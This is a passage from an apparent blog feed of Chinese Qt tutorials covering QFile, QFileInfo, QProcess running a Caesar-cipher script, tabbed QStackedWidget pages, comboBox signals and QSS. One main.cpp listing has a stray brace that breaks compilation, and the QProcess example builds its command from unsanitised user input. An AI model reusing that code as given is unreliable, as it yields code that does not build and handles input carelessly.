          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> Qt </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt(基础2)</title>
      <link href="/2019/08/31/qt4/"/>
      <url>/2019/08/31/qt4/</url>
      
        <content type="html"><![CDATA[<h2 id="QFile"><a href="#QFile" class="headerlink" title="QFile"></a>QFile</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>点击按钮弹出界面将选择读取的文件内容读取到textEdit中</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;QFile></span><span class="token comment" spellcheck="true">#include &lt;QFileDialog></span>void MainWindow::on_buttonRead_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QString path <span class="token operator">=</span> QFileDialog::getOpenFileName<span class="token punctuation">(</span>this,<span class="token string">"open"</span>,<span class="token string">"../"</span>,<span class="token string">"TXT(*.txt)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//最后一个参数可写可不写，指定打开文件的类型    if<span class="token punctuation">(</span>path.isEmpty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>false<span class="token punctuation">)</span><span class="token punctuation">{</span>        QFile file<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>//文件对象        bool isOK<span class="token operator">=</span>file.open<span class="token punctuation">(</span>QIODevice::ReadOnly<span class="token punctuation">)</span><span class="token punctuation">;</span>//以只读的方式打开        if<span class="token punctuation">(</span>isOK <span class="token operator">==</span> true<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">#if 0  //全部读</span>            QByteArray array <span class="token operator">=</span> file.readAll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//读取文件全部内容            ui-<span class="token operator">></span>textEdit-<span class="token operator">></span>setText<span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>//将文件内容显示到textEdit中<span class="token comment" spellcheck="true">#endif</span>        //按行读            QByteArray array<span class="token punctuation">;</span>            while<span class="token punctuation">(</span>file.atEnd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>false<span class="token punctuation">)</span><span class="token punctuation">{</span>                array +<span class="token operator">=</span> file.readLine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            ui-<span class="token operator">></span>textEdit-<span class="token operator">></span>setText<span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        file.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>点击按钮将textEdit的内容写到指定文件中</p><pre class=" language-bash"><code class="language-bash">void MainWindow::on_buttonWrite_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     QString path <span class="token operator">=</span> QFileDialog::getSaveFileName<span class="token punctuation">(</span>this,<span class="token string">"save"</span>,<span class="token string">"../"</span>,<span class="token string">"TXT(*.txt)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     if<span class="token punctuation">(</span>path.isEmpty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>false<span class="token punctuation">)</span><span class="token punctuation">{</span>         QFile <span class="token function">file</span><span class="token punctuation">;</span>         file.setFileName<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>         bool isOK<span class="token operator">=</span> file.open<span class="token punctuation">(</span>QIODevice::WriteOnly<span class="token punctuation">)</span><span class="token punctuation">;</span>//以写的方式打开         if<span class="token punctuation">(</span>isOK<span class="token operator">==</span> true<span class="token punctuation">)</span><span class="token punctuation">{</span>             QString str <span class="token operator">=</span> ui-<span class="token operator">></span>textEdit-<span class="token operator">></span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//获取编辑框内容             file.write<span class="token punctuation">(</span>str.toUtf8<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         file.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="QFileInfo"><a href="#QFileInfo" class="headerlink" title="QFileInfo"></a>QFileInfo</h2><p>获取文件信息</p><pre class=" language-bash"><code class="language-bash">QFileInfo info<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>info.fileName<span class="token punctuation">(</span><span class="token punctuation">)</span>.toUtf8<span class="token punctuation">(</span><span class="token punctuation">)</span>.data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//文件名字info.suffix<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//文件后缀info.size<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//文件大小info.created<span class="token punctuation">(</span><span class="token punctuation">)</span>.toString<span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd hh:mm:ss"</span><span class="token punctuation">)</span>//创建文件的时间2019-08-31 10:31:00<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#include &lt;QDateTime>)</span></code></pre><blockquote><p>注： QByteArray转为QString的方式为强制转换</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt(进阶2)</title>
      <link href="/2019/08/28/qt3/"/>
      <url>/2019/08/28/qt3/</url>
      
        <content type="html"><![CDATA[<p>本篇博客参考<a href="https://blog.csdn.net/newbee520/article/details/8279101" target="_blank" rel="noopener">链接</a></p><h2 id="QProcess类的使用"><a href="#QProcess类的使用" class="headerlink" title="QProcess类的使用"></a>QProcess类的使用</h2><ol><li>新建一个类对应一个界面，该界面将调用外部程序</li><li>代码</li></ol><p>Caesar.h</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef CAESAR_H</span><span class="token comment" spellcheck="true">#define CAESAR_H</span><span class="token comment" spellcheck="true">#include &lt;QProcess></span><span class="token comment" spellcheck="true">#include &lt;QWidget></span>namespace Ui <span class="token punctuation">{</span>class Caesar<span class="token punctuation">;</span><span class="token punctuation">}</span>class Caesar <span class="token keyword">:</span> public QWidget<span class="token punctuation">{</span>    Q_OBJECTpublic:    explicit Caesar<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ~Caesar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private:    Ui::Caesar *ui<span class="token punctuation">;</span>    QProcess *process<span class="token punctuation">;</span>    QString out<span class="token punctuation">;</span>private slots:    void readOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//从进程中读取数据    void on_encrption_button_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//点击按钮触发外部程序<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // CAESAR_H</span></code></pre><p>Caesar.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "caesar.h"</span><span class="token comment" spellcheck="true">#include "ui_caesar.h"</span><span class="token comment" spellcheck="true">#include &lt;QDebug></span>Caesar::Caesar<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span>    QWidget<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>,    ui<span class="token punctuation">(</span>new Ui::Caesar<span class="token punctuation">)</span><span class="token punctuation">{</span>    ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    this-<span class="token operator">></span>process <span class="token operator">=</span> new QProcess<span class="token punctuation">;</span>    QObject::connect<span class="token punctuation">(</span>process,SIGNAL<span class="token punctuation">(</span>readyRead<span class="token punctuation">(</span><span class="token punctuation">))</span>,this,SLOT<span class="token punctuation">(</span>readOutput<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //准备从进程里读数据的槽<span class="token punctuation">}</span>Caesar::~Caesar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span>void Caesar::on_encrption_button_clicked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QString cmd <span class="token operator">=</span> this-<span class="token operator">></span>ui-<span class="token operator">></span>keyword_line-<span class="token operator">></span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//获取keyword_line的内容    QString plaintext<span class="token operator">=</span>this-<span class="token operator">></span>ui-<span class="token operator">></span>plaintext_edit-<span class="token operator">></span>toPlainText<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cmd <span class="token operator">=</span> <span class="token string">"./caesar.py e "</span>+plaintext+<span class="token string">" "</span>+cmd<span class="token punctuation">;</span>    qDebug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>cmd<span class="token punctuation">;</span> //相当于在终端执行命令 ./caesar e hello 5     //即在终端执行cmd字符串的内容    process-<span class="token operator">></span>start<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token operator">=</span>tr<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ui-<span class="token operator">></span>ciphertext_edit-<span class="token operator">></span>setText<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void Caesar::readOutput<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    out +<span class="token operator">=</span> process-<span class="token operator">></span>readAll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    qDebug<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>out<span class="token punctuation">;</span>    ui-<span class="token operator">></span>ciphertext_edit-<span class="token operator">></span>setText<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：可执行文件一定要放在Qt项目对应的built文件中！！！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
            <tag> 嵌入式开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt(基础1)</title>
      <link href="/2019/08/27/qt2/"/>
      <url>/2019/08/27/qt2/</url>
      
        <content type="html"><![CDATA[<h2 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h2><h3 id="编辑菜单信息"><a href="#编辑菜单信息" class="headerlink" title="编辑菜单信息"></a>编辑菜单信息</h3><p><img src="https://i.postimg.cc/zBQ51cbt/1.png" alt=""></p><h3 id="转到槽函数"><a href="#转到槽函数" class="headerlink" title="转到槽函数"></a>转到槽函数</h3><p>点击第一步按钮后右键点击图中所示的菜单属性<br><img src="https://i.postimg.cc/prnvVJK2/2.png" alt=""></p><h3 id="创建触发函数"><a href="#创建触发函数" class="headerlink" title="创建触发函数"></a>创建触发函数</h3><p><img src="https://i.postimg.cc/rzXkDR95/3.png" alt=""></p><h3 id="添加槽函数内容"><a href="#添加槽函数内容" class="headerlink" title="添加槽函数内容"></a>添加槽函数内容</h3><p>在mainwindow.cpp文件中对槽函数实现的功能进行细化</p><h2 id="QWidget"><a href="#QWidget" class="headerlink" title="QWidget"></a>QWidget</h2><h3 id="Qt实现选项卡式界面"><a href="#Qt实现选项卡式界面" class="headerlink" title="Qt实现选项卡式界面"></a>Qt实现选项卡式界面</h3><p>此部分参考<a href="https://blog.csdn.net/sdzd929637/article/details/80641276" target="_blank" rel="noopener">链接</a></p><h4 id="创建新的界面"><a href="#创建新的界面" class="headerlink" title="创建新的界面"></a>创建新的界面</h4><ol><li><img src="https://i.postimg.cc/kgC2Z2dV/4.png" alt=""><br><img src="https://i.postimg.cc/50Xyvv8r/5.jpg" alt=""></li><li>实现各个界面对应功能(界面需继承自QWidget类)</li><li>新建一个Content类，继承自QFrame。在Content类中，创建一个QStackedWidget对象，然后将页面插入到此对象中。<br>content.h<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef CONTENT_H</span><span class="token comment" spellcheck="true">#define CONTENT_H</span><span class="token comment" spellcheck="true">#include &lt;QFrame></span><span class="token comment" spellcheck="true">#include &lt;QStackedWidget></span><span class="token comment" spellcheck="true">#include "affine.h"  //界面1头文件</span><span class="token comment" spellcheck="true">#include "vigenere.h"  //界面2头文件</span><span class="token comment" spellcheck="true">#include &lt;QGridLayout></span>namespace Ui <span class="token punctuation">{</span>class content<span class="token punctuation">;</span><span class="token punctuation">}</span>class content <span class="token keyword">:</span> public QFrame<span class="token punctuation">{</span> Q_OBJECTpublic: explicit content<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span> QStackedWidget *stack<span class="token punctuation">;</span>   affine *aff<span class="token punctuation">;</span>   //界面1 vigenere *vig<span class="token punctuation">;</span>  //界面2 ~content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>signals:public slots:private: Ui::content *ui<span class="token punctuation">;</span> QGridLayout *mainLayout<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // CONTENT_H</span></code></pre></li></ol><p>content.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "content.h"</span><span class="token comment" spellcheck="true">#include "ui_content.h"</span>content::content<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span>    QFrame<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>,    ui<span class="token punctuation">(</span>new Ui::content<span class="token punctuation">)</span><span class="token punctuation">{</span>    ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack <span class="token operator">=</span> new QStackedWidget<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack-<span class="token operator">></span>setFrameStyle<span class="token punctuation">(</span>QFrame::Panel <span class="token operator">|</span> QFrame::Raised<span class="token punctuation">)</span><span class="token punctuation">;</span>    //插入页面    aff <span class="token operator">=</span> new affine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//指针名    vig <span class="token operator">=</span> new vigenere<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack -<span class="token operator">></span> addWidget<span class="token punctuation">(</span>aff<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack -<span class="token operator">></span> addWidget<span class="token punctuation">(</span>vig<span class="token punctuation">)</span><span class="token punctuation">;</span>    mainLayout <span class="token operator">=</span> new QGridLayout<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    mainLayout-<span class="token operator">></span>setMargin<span class="token punctuation">(</span>2<span class="token punctuation">)</span><span class="token punctuation">;</span> //参数固定为2    mainLayout-<span class="token operator">></span>addWidget<span class="token punctuation">(</span>stack,0,0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>content::~content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>mainwidow.h</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef MAINWINDOW_H</span><span class="token comment" spellcheck="true">#define MAINWINDOW_H</span><span class="token comment" spellcheck="true">#include "content.h"</span><span class="token comment" spellcheck="true">#include &lt;QGridLayout></span><span class="token comment" spellcheck="true">#include &lt;QMainWindow></span>namespace Ui <span class="token punctuation">{</span>class MainWindow<span class="token punctuation">;</span><span class="token punctuation">}</span>class MainWindow <span class="token keyword">:</span> public QMainWindow<span class="token punctuation">{</span>    Q_OBJECTpublic:    explicit MainWindow<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ~MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    content *con<span class="token punctuation">;</span>    QGridLayout *mainLayout<span class="token punctuation">;</span>    void createAction<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    void createToolBar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private:    QToolBar *stackTool<span class="token punctuation">;</span>    QAction *openStack<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">;</span>//界面数    Ui::MainWindow *ui<span class="token punctuation">;</span>private slots:    void openAffine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    void openVigenere<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // MAINWINDOW_H</span></code></pre><p>mainwindow.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "mainwindow.h"</span><span class="token comment" spellcheck="true">#include "ui_mainwindow.h"</span><span class="token comment" spellcheck="true">#include &lt;QGridLayout></span><span class="token comment" spellcheck="true">#include &lt;QToolBar></span><span class="token comment" spellcheck="true">#define SHADOW_WIDT 5</span>MainWindow::MainWindow<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span>    QMainWindow<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>,    ui<span class="token punctuation">(</span>new Ui::MainWindow<span class="token punctuation">)</span><span class="token punctuation">{</span>    ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    QWidget w<span class="token punctuation">;</span>    createAction<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    createToolBar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    con <span class="token operator">=</span> new content<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>    setCentralWidget<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">;</span>    w.show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>MainWindow::~MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span>void MainWindow :: createAction<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    openStack<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>new QAction<span class="token punctuation">(</span>tr<span class="token punctuation">(</span><span class="token string">"affine"</span><span class="token punctuation">)</span>,this<span class="token punctuation">)</span><span class="token punctuation">;</span>    openStack<span class="token punctuation">[</span>0<span class="token punctuation">]</span>-<span class="token operator">></span>setStatusTip<span class="token punctuation">(</span>tr<span class="token punctuation">(</span><span class="token string">"界面一"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>    connect<span class="token punctuation">(</span>openStack<span class="token punctuation">[</span>0<span class="token punctuation">]</span>,SIGNAL<span class="token punctuation">(</span>triggered<span class="token punctuation">(</span>bool<span class="token punctuation">))</span>,this,SLOT<span class="token punctuation">(</span>openAffine<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    openStack<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>new QAction<span class="token punctuation">(</span>tr<span class="token punctuation">(</span><span class="token string">"vigenere"</span><span class="token punctuation">)</span>,this<span class="token punctuation">)</span><span class="token punctuation">;</span>    openStack<span class="token punctuation">[</span>1<span class="token punctuation">]</span>-<span class="token operator">></span>setStatusTip<span class="token punctuation">(</span>tr<span class="token punctuation">(</span><span class="token string">"界面二"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>    connect<span class="token punctuation">(</span>openStack<span class="token punctuation">[</span>1<span class="token punctuation">]</span>,SIGNAL<span class="token punctuation">(</span>triggered<span class="token punctuation">(</span>bool<span class="token punctuation">))</span>,this,SLOT<span class="token punctuation">(</span>openVigenere<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void MainWindow::createToolBar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    stackTool <span class="token operator">=</span> addToolBar<span class="token punctuation">(</span><span class="token string">"tools"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stackTool-<span class="token operator">></span>addAction<span class="token punctuation">(</span>openStack<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //加入QToolBar头文件    stackTool-<span class="token operator">></span>addAction<span class="token punctuation">(</span>openStack<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void MainWindow::openAffine<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    this-<span class="token operator">></span>con-<span class="token operator">></span>stack-<span class="token operator">></span>setCurrentIndex<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>void MainWindow::openVigenere<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    this-<span class="token operator">></span>con-<span class="token operator">></span>stack-<span class="token operator">></span>setCurrentIndex<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>main.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "mainwindow.h"</span><span class="token comment" spellcheck="true">#include &lt;QApplication></span><span class="token comment" spellcheck="true">#include &lt;QFile></span><span class="token comment" spellcheck="true">#include &lt;QApplication></span>int main<span class="token punctuation">(</span>int argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QApplication a<span class="token punctuation">(</span>argc, argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    MainWindow w<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    w.show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a.exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="comboBox"><a href="#comboBox" class="headerlink" title="comboBox"></a>comboBox</h2><p>当comboBox所选值不一样时，textEdit显示不同的值<br>本部分参考博客<a href="https://blog.csdn.net/u012640973/article/details/78688225" target="_blank" rel="noopener">链接</a></p><ol><li><p>mainWinodw.h</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#ifndef MAINWINDOW_H</span><span class="token comment" spellcheck="true">#define MAINWINDOW_H</span><span class="token comment" spellcheck="true">#include &lt;QComboBox></span><span class="token comment" spellcheck="true">#include &lt;QMainWindow></span>namespace Ui <span class="token punctuation">{</span>class MainWindow<span class="token punctuation">;</span><span class="token punctuation">}</span>class MainWindow <span class="token keyword">:</span> public QMainWindow<span class="token punctuation">{</span> Q_OBJECTpublic: explicit MainWindow<span class="token punctuation">(</span>QWidget *parent <span class="token operator">=</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span> ~MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>private slots: void choose<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//声明槽函数private: Ui::MainWindow *ui<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#endif // MAINWINDOW_H</span></code></pre></li><li><p>mainWindow.cpp</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include "mainwindow.h"</span><span class="token comment" spellcheck="true">#include "ui_mainwindow.h"</span><span class="token comment" spellcheck="true">#include &lt;QFile></span>MainWindow::MainWindow<span class="token punctuation">(</span>QWidget *parent<span class="token punctuation">)</span> <span class="token keyword">:</span> QMainWindow<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>, ui<span class="token punctuation">(</span>new Ui::MainWindow<span class="token punctuation">)</span><span class="token punctuation">{</span> ui-<span class="token operator">></span>setupUi<span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> connect<span class="token punctuation">(</span>ui-<span class="token operator">></span>comboBox,SIGNAL<span class="token punctuation">(</span>currentIndexChanged<span class="token punctuation">(</span>QString<span class="token punctuation">))</span>,this,SLOT<span class="token punctuation">(</span>choose<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//信号<span class="token punctuation">}</span>MainWindow::~MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> delete ui<span class="token punctuation">;</span><span class="token punctuation">}</span>void MainWindow::choose<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> if<span class="token punctuation">(</span>ui-<span class="token operator">></span>comboBox-<span class="token operator">></span>currentIndex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>     ui-<span class="token operator">></span>port_line-<span class="token operator">></span>setText<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> if<span class="token punctuation">(</span>ui-<span class="token operator">></span>comboBox-<span class="token operator">></span>currentIndex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>1<span class="token punctuation">)</span><span class="token punctuation">{</span>     ui-<span class="token operator">></span>port_line-<span class="token operator">></span>setText<span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     ui-<span class="token operator">></span>port_line-<span class="token operator">></span>setText<span class="token punctuation">(</span><span class="token string">"1111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ol><blockquote><p>注：currentIndex()对应comboBox里的值的顺序</p></blockquote><hr><h2 id="QSS"><a href="#QSS" class="headerlink" title="QSS"></a>QSS</h2><p>Qt自己的CSS简称QSS</p><h2 id="在QT中的应用"><a href="#在QT中的应用" class="headerlink" title="在QT中的应用"></a>在QT中的应用</h2><ol><li>在QT所在的build文件中放入.css文件</li><li>在main.cpp文件中加入以下内容</li></ol><pre class=" language-bash"><code class="language-bash">int main<span class="token punctuation">(</span>int argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    QApplication a<span class="token punctuation">(</span>argc, argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    MainWindow w<span class="token punctuation">;</span>    QFile qssFile<span class="token punctuation">(</span><span class="token string">"qt.css"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    qssFile.open<span class="token punctuation">(</span>QFile::ReadOnly<span class="token punctuation">)</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>qssFile.isOpen<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">{</span>        QString qss <span class="token operator">=</span> QLatin1String<span class="token punctuation">(</span>qssFile.readAll<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        qApp-<span class="token operator">></span>setStyleSheet<span class="token punctuation">(</span>qss<span class="token punctuation">)</span><span class="token punctuation">;</span>        qssFile.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    w.show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a.exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 项目开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言笔记（一）</title>
      <link href="/2019/08/25/c-7/"/>
      <url>/2019/08/25/c-7/</url>
      
